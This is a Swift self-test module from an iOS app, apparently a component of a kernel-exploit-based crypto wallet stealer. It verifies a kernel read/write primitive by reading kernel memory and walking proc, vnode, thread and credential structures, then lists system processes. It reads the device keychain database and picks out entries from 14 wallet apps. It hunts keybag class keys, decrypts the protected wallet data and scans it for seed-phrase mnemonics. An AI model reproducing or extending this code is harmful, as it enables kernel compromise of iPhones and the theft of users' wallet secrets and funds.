//
//  SelfCheck.swift
//  lara
//
//  上机自检：一次运行把所有不确定项打出来
//
//  设计思路：不靠「猜偏移对不对」，靠「读出来的值语义是否自洽」
//    p_pid 读出来必须等于 getpid()
//    p_name 读出来必须是 Liebao
//    p_textvp → vnode → v_name 必须是 Liebao
//    p_fd → filedesc → fd_cdir → vnode → v_name 必须是 /
//    thread → t_tro → thread_ro → tro_proc 必须指回本进程
//  这几条同时对上，就证明 proc/vnode/filedesc/thread 的偏移全部正确。
//
//  同时把 keybag class key 猎取、SFAC 解密、助记词识别跑一遍。
//

import Foundation
import SwiftUI
import Darwin
import UIKit

// MARK: - 结果模型

struct CheckItem {
    enum Status: String {
        case pass = "PASS"
        case fail = "FAIL"
        case warn = "WARN"
        case info = "INFO"
    }
    let name: String
    let status: Status
    let detail: String
}

final class SelfCheck: ObservableObject {

    static let shared = SelfCheck()

    @Published var items: [CheckItem] = []
    @Published var running = false
    @Published var finished = false

    private var mgr: laramgr { laramgr.shared }

    private func add(_ name: String, _ st: CheckItem.Status, _ detail: String) {
        DispatchQueue.main.async {
            self.items.append(CheckItem(name: name, status: st, detail: detail))
        }
        mgr.logmsg("[sc] \(st.rawValue) \(name): \(detail)")
    }

    // MARK: - 主入口

    func runAll() {
        guard !running else { return }
        running = true
        finished = false
        items = []
        mgr.logmsg("[sc] ===== 自检开始 =====")

        DispatchQueue.global(qos: .userInitiated).async {
            self.checkEnv()
            self.checkKernel()
            self.checkOffsets()
            self.checkSemantic()
            self.checkProcList()
            self.checkClassKey()
            self.checkMnemonicSelfTest()
            self.finish()
        }
    }

    private func finish() {
        dump()
        DispatchQueue.main.async {
            self.running = false
            self.finished = true
        }
        mgr.logmsg("[sc] ===== 自检结束 =====")
    }

    // MARK: - 1 环境

    private func checkEnv() {
        let v = UIDevice.current
        add("设备", .info, "\(KeychainDumpManager.sysctlString("hw.machine") ?? "?") / iOS \(v.systemVersion)")
        add("内核基址", .info, String(format: "0x%llx  slide 0x%llx",
                                   KernelScan.kernelBase, UInt64(ds_get_kernel_slide())))
        add("PAC mask", .info, String(format: "0x%llx", pac_mask))
        add("t1sz_boot", .info, String(format: "0x%llx", t1sz_boot))
    }

    // MARK: - 2 内核读写

    private func checkKernel() {
        add("darksword ready", ds_is_ready() ? .pass : .fail, ds_is_ready() ? "就绪" : "未就绪，后面全部跳过")
        guard ds_is_ready() else { return }

        if let d = KernelScan.read(KernelScan.kernelBase, 16) {
            add("读内核首页", .pass, d.map { String(format: "%02x", $0) }.joined())
        } else {
            add("读内核首页", .fail, "读不出来")
        }

        let ourProc = UInt64(ds_get_our_proc())
        let ourTask = UInt64(ds_get_our_task())
        add("our_proc", ourProc != 0 ? .pass : .fail, String(format: "0x%llx", ourProc))
        add("our_task", ourTask != 0 ? .pass : .fail, String(format: "0x%llx", ourTask))
    }

    // MARK: - 3 偏移表

    private func checkOffsets() {
        let offs: [(String, UInt32)] = [
            ("p_proc_ro", off_proc_p_proc_ro), ("p_pid", off_proc_p_pid),
            ("p_fd", off_proc_p_fd), ("p_flag", off_proc_p_flag),
            ("p_textvp", off_proc_p_textvp), ("p_name", off_proc_p_name),
            ("pr_task", off_proc_ro_pr_task), ("p_ucred", off_proc_ro_p_ucred),
            ("fd_ofiles", off_filedesc_fd_ofiles), ("fd_cdir", off_filedesc_fd_cdir),
            ("v_name", off_vnode_v_name), ("v_data", off_vnode_v_data),
            ("t_tro", off_thread_t_tro), ("tro_proc", off_thread_ro_tro_proc),
            ("ctid", off_thread_ctid), ("mutex", off_thread_mutex_lck_mtx_data),
            ("inp_next", off_inpcb_inp_list_le_next),
            ("inp_pcbinfo", off_inpcb_inp_pcbinfo),
            ("inp_socket", off_inpcb_inp_socket),
            ("so_usecount", off_socket_so_usecount),
            ("so_proto", off_socket_so_proto),
        ]
        var zero: [String] = []
        var s: [String] = []
        for (n, v) in offs {
            if v == 0 { zero.append(n) }
            s.append("\(n)=0x\(String(v, radix: 16))")
        }
        add("偏移表", zero.isEmpty ? .pass : .fail,
            zero.isEmpty ? "\(offs.count) 项全部非 0" : "为 0 的: \(zero.joined(separator: ","))")
        add("偏移明细", .info, s.joined(separator: " "))

        let keys = ["lara.allprocoff", "lara.kernprocoff", "lara.rootvnodeoff", "lara.kernproc_size"]
        var kv: [String] = []
        for k in keys {
            if let n = UserDefaults.standard.object(forKey: k) as? NSNumber {
                kv.append("\(k.replacingOccurrences(of: "lara.", with: ""))=0x\(String(n.uint64Value, radix: 16))")
            } else {
                kv.append("\(k.replacingOccurrences(of: "lara.", with: ""))=缺失")
            }
        }
        add("动态符号", kv.contains(where: { $0.contains("缺失") }) ? .warn : .pass,
            kv.joined(separator: " "))
    }

    // MARK: - 4 语义自洽（核心）

    private func checkSemantic() {
        let proc = UInt64(ds_get_our_proc())
        guard proc != 0 else { add("语义校验", .fail, "没有 our_proc"); return }

        // p_pid 必须等于 getpid()
        let pid = KernelScan.rd32(proc + UInt64(off_proc_p_pid))
        let realPid = UInt32(getpid())
        add("p_pid == getpid()", pid == realPid ? .pass : .fail,
            "读出 \(pid) / 实际 \(realPid)")

        // p_name 必须是 Liebao
        var name = ""
        if off_proc_p_name != 0, let d = KernelScan.read(proc + UInt64(off_proc_p_name), 32) {
            name = String(decoding: d.prefix(while: { $0 != 0 }), as: UTF8.self)
        }
        add("p_name", name == "Liebao" ? .pass : .fail, "\"\(name)\"")

        // p_proc_ro → pr_task
        let procRo = KernelScan.rd64(proc + UInt64(off_proc_p_proc_ro))
        add("p_proc_ro 非空", procRo > KernelScan.kernelBase ? .pass : .fail,
            String(format: "0x%llx", procRo))
        let task = KernelScan.rd64(procRo + UInt64(off_proc_ro_pr_task))
        let realTask = UInt64(ds_get_our_task())
        add("pr_task == our_task", task == realTask ? .pass : .fail,
            String(format: "0x%llx / 0x%llx", task, realTask))

        // p_textvp → vnode → v_name 必须是 Liebao
        let textvp = KernelScan.rd64(proc + UInt64(off_proc_p_textvp))
        add("p_textvp 非空", textvp > KernelScan.kernelBase ? .pass : .fail,
            String(format: "0x%llx", textvp))
        if textvp != 0 {
            var vname = ""
            if let d = KernelScan.read(textvp + UInt64(off_vnode_v_name), 64) {
                vname = String(decoding: d.prefix(while: { $0 != 0 && $0 >= 0x20 && $0 < 0x7F }), as: UTF8.self)
            }
            add("p_textvp→v_name", vname == "Liebao" ? .pass : .fail, "\"\(vname)\"")
            let usecount = KernelScan.rd32(textvp + UInt64(off_vnode_v_usecount))
            add("v_usecount 合理", usecount > 0 && usecount < 100000 ? .pass : .warn, "\(usecount)")
        }

        // p_fd → filedesc → fd_cdir → vnode → v_name 必须是 /
        let fd = KernelScan.rd64(proc + UInt64(off_proc_p_fd))
        add("p_fd 非空", fd > KernelScan.kernelBase ? .pass : .fail,
            String(format: "0x%llx", fd))
        if fd != 0 {
            let ofiles = KernelScan.rd64(fd + UInt64(off_filedesc_fd_ofiles))
            add("fd_ofiles 非空", ofiles > KernelScan.kernelBase ? .pass : .fail,
                String(format: "0x%llx", ofiles))
            let cdir = KernelScan.rd64(fd + UInt64(off_filedesc_fd_cdir))
            if cdir != 0, let d = KernelScan.read(cdir + UInt64(off_vnode_v_name), 64) {
                let cn = String(decoding: d.prefix(while: { $0 != 0 && $0 >= 0x20 && $0 < 0x7F }), as: UTF8.self)
                add("fd_cdir→v_name", cn == "/" ? .pass : .warn, "\"\(cn)\"（期望 /）")
            }
        }

        // thread → t_tro → tro_proc 必须指回 proc
        let tq = KernelScan.rd64(realTask + UInt64(off_task_threads_next))
        add("task_threads_next 非空", tq > KernelScan.kernelBase ? .pass : .fail,
            String(format: "0x%llx", tq))
        if tq != 0 {
            // task_threads_next 是 queue 头，第一个 thread 是 queue 的 next
            let th = KernelScan.rd64(tq)
            let ctid = KernelScan.rd32(th + UInt64(off_thread_ctid))
            add("thread.ctid 合理", ctid < 100000 ? .pass : .warn, "\(ctid)")
            let tro = KernelScan.rd64(th + UInt64(off_thread_t_tro))
            add("thread.t_tro 非空", tro > KernelScan.kernelBase ? .pass : .fail,
                String(format: "0x%llx", tro))
            if tro > KernelScan.kernelBase && off_thread_ro_tro_proc != 0 {
                let tp = KernelScan.rd64(tro + UInt64(off_thread_ro_tro_proc))
                add("tro_proc == our_proc", tp == proc ? .pass : .warn,
                    String(format: "0x%llx / 0x%llx", tp, proc))
            }
        }

        // ucred → cr_label → l_perpolicy[amfi]
        let ucred = KernelScan.rd64(procRo + UInt64(off_proc_ro_p_ucred))
        add("p_ucred 非空", ucred > KernelScan.kernelBase ? .pass : .fail,
            String(format: "0x%llx", ucred))
        if ucred != 0 {
            let label = KernelScan.rd64(ucred + UInt64(off_ucred_cr_label))
            add("cr_label 非空", label > KernelScan.kernelBase ? .pass : .fail,
                String(format: "0x%llx", label))
            if label != 0 {
                // l_perpolicy[amfi] 是 label + 偏移，里面是个指针
                let amfiSlot = label + UInt64(off_label_l_perpolicy_amfi)
                let amfi = KernelScan.rd64(amfiSlot)
                add("l_perpolicy[amfi]", amfi > KernelScan.kernelBase ? .pass : .warn,
                    String(format: "0x%llx", amfi))
            }
        }

        // socket / inpcb
        if off_socket_so_usecount != 0 {
            let pcb = UInt64(ds_get_rw_socket_pcb())
            add("rw_socket pcb", pcb > KernelScan.kernelBase ? .pass : .fail,
                String(format: "0x%llx", pcb))
            if pcb != 0 {
                let so = KernelScan.rd64(pcb + UInt64(off_inpcb_inp_socket))
                add("inp_socket 非空", so > KernelScan.kernelBase ? .pass : .fail,
                    String(format: "0x%llx", so))
                if so != 0 {
                    let uc = KernelScan.rd32(so + UInt64(off_socket_so_usecount))
                    add("so_usecount 合理", uc > 0 && uc < 100000 ? .pass : .warn, "\(uc)")
                }
            }
        }
    }

    // MARK: - 5 进程遍历

    private func checkProcList() {
        let head = KernelScan.allprocAddress()
        add("allproc 地址", head > KernelScan.kernelBase ? .pass : .fail,
            String(format: "0x%llx", head))
        guard head != 0 else { return }

        let all = KernelScan.allProcs()
        add("进程数", all.count > 10 && all.count < 2000 ? .pass : .fail, "\(all.count) 个")
        if !all.isEmpty {
            let sample = all.prefix(12).map { "\($0.pid):\($0.name)" }.joined(separator: " ")
            add("进程样本", .info, sample)
        }
        for t in ["securityd", "trustd", "keybagd", "SpringBoard"] {
            if let pi = all.first(where: { $0.name == t }) {
                add("找到 \(t)", .pass, "pid=\(pi.pid) task=\(String(format: "0x%llx", pi.task))")
            } else {
                add("找到 \(t)", .warn, "不在列表里（扫描时会被跳过）")
            }
        }
    }

    // MARK: - 6 class key 猎取（真跑一次）

    private func checkClassKey() {
        // 优先用设备上真实的 keychain db
        var rows: [GenpExtractor.Row] = []
        if let db = mgr.vfsread(path: "/private/var/Keychains/keychain-2.db", maxSize: 200 * 1024 * 1024) {
            let tmp = NSTemporaryDirectory() + "sc_kc.db"
            try? db.write(to: URL(fileURLWithPath: tmp))
            rows = GenpExtractor.extract(dbPath: tmp)
            try? FileManager.default.removeItem(atPath: tmp)
            add("设备 keychain", .pass, "\(rows.count) 行 genp")
        } else {
            add("设备 keychain", .warn, "读不到（vfs 未就绪？）")
        }

        let wallet = rows.filter { r in
            let a = r.agrp.lowercased()
            return GenpExtractor.walletAgrpPatterns.contains { a.contains($0) }
        }
        add("钱包 genp 行", wallet.isEmpty ? .warn : .pass,
            wallet.isEmpty ? "本机没装那 14 个钱包" : "\(wallet.count) 行")

        guard let first = wallet.first else {
            add("class key 猎取", .warn, "没有可测样本，跳过")
            return
        }
        guard let sac = SFACParser.parse(first.data) else {
            add("class key 猎取", .fail, "rowid=\(first.rowid) 解析不出 SFAC 结构")
            return
        }
        add("SFAC 样本", .info,
            "rowid=\(first.rowid) iv=\(sac.iv.count)B ct=\(sac.ciphertext.count)B tag=\(sac.authCode.count)B")

        let t0 = Date()
        if let key = ClassKeyHunter.hunt(sac: sac, hint: first.agrp) {
            let ms = Int(Date().timeIntervalSince(t0) * 1000)
            add("class key", .pass,
                "找到 \(key.count)B key=\(key.prefix(8).map { String(format: "%02x", $0) }.joined())… 用时 \(ms)ms")
            // 立刻验证解密
            if let pt = AESCTR.decrypt(key: key, iv: sac.iv, ciphertext: sac.ciphertext) {
                let head = String(decoding: pt.prefix(40), as: UTF8.self)
                    .replacingOccurrences(of: "\n", with: " ")
                add("SFAC 解密", .pass, "\(pt.count) B  头 40: \(head)")
                // 顺手跑一次助记词
                let hits = MnemonicDetector.find(in: pt)
                add("助记词", hits.isEmpty ? .warn : .pass,
                    hits.isEmpty ? "这行没有助记词" : "\(hits.count) 组 \(hits[0].lang) \(hits[0].wordCount)词")
            } else {
                add("SFAC 解密", .fail, "有 key 但解不出来（模式或 IV 不对）")
            }
        } else {
            let ms = Int(Date().timeIntervalSince(t0) * 1000)
            add("class key", .fail, "全部进程都没找到，耗时 \(ms)ms。按 06 文档 2.5 节换方案")
        }
    }

    // MARK: - 7 助记词自检（用已知向量）

    private func checkMnemonicSelfTest() {
        let known = "abandon ability able about above absent absorb abstract absurd abuse access accident"
        let hits = MnemonicDetector.find(in: known)
        add("助记词自检(英)", hits.count == 1 && hits[0].wordCount == 12 ? .pass : .fail,
            hits.isEmpty ? "识别不出来（词表没进包？）" : "\(hits.count) 组 \(hits[0].matched)/12")

        let zh = "的 一 是 在 不 了 有 和 人 这 中 大"
        let hz = MnemonicDetector.find(in: zh)
        add("助记词自检(简中)", hz.isEmpty ? .warn : .pass,
            hz.isEmpty ? "没识别（中文词表可能没进包）" : "\(hz.count) 组")

        // 反向：普通文本不该误报
        let noise = "this is just a normal sentence with some random words in it nothing special"
        let hn = MnemonicDetector.find(in: noise)
        add("误报自检", hn.isEmpty ? .pass : .warn, hn.isEmpty ? "正常文本无命中" : "误报 \(hn.count) 组")
    }

    // MARK: - 导出报告

    func reportText() -> String {
        var s = ""
        s += "IOS2 自检报告\n"
        s += "时间: \(ISO8601DateFormatter().string(from: Date()))\n"
        s += "设备: \(KeychainDumpManager.sysctlString("hw.machine") ?? "?")  iOS \(UIDevice.current.systemVersion)\n"
        s += String(format: "内核: 0x%llx  slide 0x%llx\n\n", KernelScan.kernelBase, UInt64(ds_get_kernel_slide()))
        for it in items {
            s += "[\(it.status.rawValue)] \(it.name)\n        \(it.detail)\n"
        }
        let fails = items.filter { $0.status == .fail }.count
        let warns = items.filter { $0.status == .warn }.count
        s += "\n合计 \(items.count) 项：失败 \(fails) / 警告 \(warns) / 通过 \(items.count - fails - warns)\n"
        return s
    }

    private func dump() {
        let txt = reportText()
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let f = docs.appendingPathComponent("selfcheck_\(Int(Date().timeIntervalSince1970)).txt")
        try? txt.write(to: f, atomically: true, encoding: .utf8)
        mgr.logmsg("[sc] 报告已存 \(f.lastPathComponent)")
    }
}
